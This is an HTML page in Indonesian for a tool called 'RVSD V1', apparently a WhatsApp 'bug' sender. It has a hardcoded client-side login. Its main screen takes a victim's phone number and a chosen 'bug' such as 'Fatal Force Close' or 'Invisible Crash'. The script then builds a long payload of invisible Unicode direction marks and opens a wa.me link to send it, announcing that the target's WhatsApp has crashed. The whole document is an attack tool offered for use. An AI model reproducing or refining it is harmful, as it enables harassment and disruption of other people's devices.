<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>RVSD V1</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap');
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Orbitron',sans-serif;}
    body{background:#000;color:#fff;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;background:radial-gradient(circle at center,#1a0033,#000);}
    .glow{border:2px solid #ff00ff;border-radius:15px;box-shadow:0 0 20px #ff00ff,inset 0 0 20px #ff00ff;}
    .login,.menu{display:none;flex-direction:column;align-items:center;width:90%;max-width:400px;}
    .login.active,.menu.active{display:flex;}
    .logo{width:120px;height:120px;border-radius:50%;background:url('avatar.png') center/cover;border:3px solid #ff00ff;box-shadow:0 0 30px #ff00ff;margin-bottom:20px;}
    h1{font-size:2.5em;color:#ff00ff;text-shadow:0 0 10px #ff00ff;}
    p{font-size:1.1em;margin:10px 0;color:#ccc;}
    input,select{width:100%;padding:15px;margin:10px 0;background:#111;border:2px solid #ff00ff;border-radius:12px;color:#fff;font-size:1em;outline:none;}
    button{width:100%;padding:18px;margin:20px 0;background:linear-gradient(45deg,#ff00ff,#9900ff);border:none;border-radius:50px;color:#fff;font-size:1.3em;cursor:pointer;box-shadow:0 0 20px #ff00ff;}
    .card{background:rgba(30,0,60,0.8);padding:20px;border-radius:15px;text-align:center;margin-bottom:30px;}
    .avatar{width:90px;height:90px;border-radius:50%;background:url('avatar.png') center/cover;border:3px solid #ff00ff;box-shadow:0 0 20px #ff00ff;}
    .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#ff0066;padding:15px 30px;border-radius:50px;box-shadow:0 0 20px #ff0066;z-index:999;animation:pop 0.4s;display:none;}
    @keyframes pop{0%{opacity:0;transform:translateX(-50%) translateY(20px)}100%{opacity:1;transform:translateX(-50%) translateY(0)}}
  </style>
</head>
<body>
  <div id="login" class="login active glow">
    <div class="logo"></div>
    <h1>Welcome Back</h1>
    <p>Login to continue</p>
    <input type="text" id="user" placeholder="Username"/>
    <input type="password" id="pass" placeholder="Password"/>
    <button onclick="cek()">LOGIN</button>
  </div>

  <div id="menu" class="menu">
    <div class="card glow">
      <div class="avatar"></div>
      <h2 style="margin:15px 0;color:#ff00ff;">permenmd</h2>
      <p>Role: <b>Developer</b> • Exp: <b>9999999-09-99</b></p>
    </div>
    <div class="card glow">
      <h2 style="color:#ff00ff;margin-bottom:15px;">Target Number</h2>
      <input type="text" id="nomor" placeholder="contoh: 6285211519578" maxlength="15"/>
      <h2 style="color:#ff00ff;margin:20px 0 10px;">Select Bug</h2>
      <select id="bug">
        <option value="">Pilih Bug Dulu</option>
        <option>Fatal Force Close</option>
        <option>Invisible Crash</option>
        <option>Delay 60 Detik</option>
      </select>
      <button onclick="kirim()">SEND BUG</button>
    </div>
  </div>

  <div id="toast" class="toast"></div>

<script>
function cek(){if(document.getElementById('user').value==='790'&&document.getElementById('pass').value==='rvsdgcorparah'){document.getElementById('login').classList.remove('active');document.getElementById('menu').classList.add('active');}else{toast('Salah bro!')}} 
function toast(m){document.getElementById('toast').innerText=m;document.getElementById('toast').style.display='block';setTimeout(()=>{document.getElementById('toast').style.display='none'},2500)}
function kirim(){
  let n=document.getElementById('nomor').value.trim();
  let b=document.getElementById('bug').value;
  if(!n.match(/^62[0-9]{9,13}$/)){toast('Nomor WA salah! Harus 62...');return}
  if(!b){toast('Pilih Dulu Geh');return}
  let payload = '‏‏‎ ‎‏‏‎ ‎‏‏‎ ‎‏‏‎ ‎‏‏‎ ‎‏‏‎ ‎‏‏‎ ‎‏‏‎ ‎‏‏‎ ‎‏‏‎ '.repeat(99);
  if(b.includes('Force')) payload += '‎‏‏‎‏‏‎‏‏‎';
  if(b.includes('Invisible')) payload = payload.replace(/./g,'\u200F');
  if(b.includes('Delay')) payload = '‎‏‏‎'.repeat(500);
  window.open(`https://wa.me/${n}?text=${encodeURIComponent(payload)}`,'_blank');
  toast('BUG TERKIRIM! Target WA CRASH!');
}
</script>
</body>
</html>
